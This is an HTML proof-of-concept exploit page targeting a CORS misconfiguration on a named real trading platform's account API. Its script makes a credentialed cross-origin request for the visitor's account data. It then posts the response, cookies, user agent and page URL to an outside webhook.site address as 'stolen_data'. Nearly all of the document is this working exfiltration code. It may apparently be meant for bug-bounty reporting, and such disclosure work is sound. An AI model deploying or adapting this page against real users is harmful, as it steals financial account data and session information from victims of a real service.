<!DOCTYPE html>
<html>
<head>
    <title>CORS Misconfiguration PoC - Capital.com</title>
</head>
<body>
    <h1>CORS Exploit Test (api.mycapital.capital.com)</h1>
    <p>Exploitation Status: <strong id="status" style="color: blue;">Connecting to API...</strong></p>
    
    <h3>Response from Backend Server:</h3>
    <textarea id="output" rows="10" cols="80" readonly style="font-family: monospace;"></textarea>

    <script>
        // ============================================================
        // KONFIGURASI
        // ============================================================
        // Target endpoint yang rentan
        const targetUrl = 'https://api.mycapital.capital.com/v1/account';
        
        // Webhook untuk menerima data curian
        const webhookUrl = 'https://webhook.site/4b9a010c-3e6f-457f-bb62-2f2cec3f559c';
        
        // Origin yang digunakan (untuk dokumentasi)
        const origin = 'https://hexatara.github.io/hexatara/';

        // ============================================================
        // EKSEKUSI EXPLOIT
        // ============================================================
        // Perform cross-origin request with credentials enabled (cookies/session)
        fetch(targetUrl, {
            method: 'GET',
            credentials: 'include', // Mengirim cookie/session korban!
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Origin': origin // Menambahkan origin header
            }
        })
        .then(response => {
            // Jika response bisa dibaca, CORS protection rusak!
            document.getElementById('status').innerText = '✅ SUCCESS! Data Successfully Exfiltrated (CORS Leaked)';
            document.getElementById('status').style.color = 'red';
            return response.text();
        })
        .then(data => {
            // Tampilkan data di halaman
            document.getElementById('output').value = data;

            // ============================================================
            // KIRIM DATA KE WEBHOOK
            // ============================================================
            try {
                // Data yang akan dikirim
                const payload = {
                    origin: origin,
                    target: targetUrl,
                    victim: {
                        url: window.location.href,
                        userAgent: navigator.userAgent,
                        cookies: document.cookie || 'No cookies visible',
                        timestamp: new Date().toISOString()
                    },
                    stolen_data: data,
                    status: 'success'
                };

                // Kirim ke webhook
                fetch(webhookUrl, {
                    method: 'POST',
                    mode: 'no-cors', // Penting: izinkan pengiriman ke domain berbeda
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                // Tambahkan notifikasi di output
                document.getElementById('output').value += 
                    '\n\n========================================\n' +
                    '✅ DATA SENT TO WEBHOOK:\n' +
                    webhookUrl + '\n' +
                    '========================================\n';

                console.log('[+] Data sent to webhook:', webhookUrl);

            } catch (e) {
                document.getElementById('output').value += 
                    '\n\n⚠️ Could not send to webhook: ' + e.message;
                console.error('Webhook error:', e);
            }
        })
        .catch(error => {
            document.getElementById('status').innerText = '❌ Failed: Access blocked by browser CORS policy.';
            document.getElementById('status').style.color = 'green';
            document.getElementById('output').value = 'Error: ' + error;
        });
    </script>
</body>
</html>
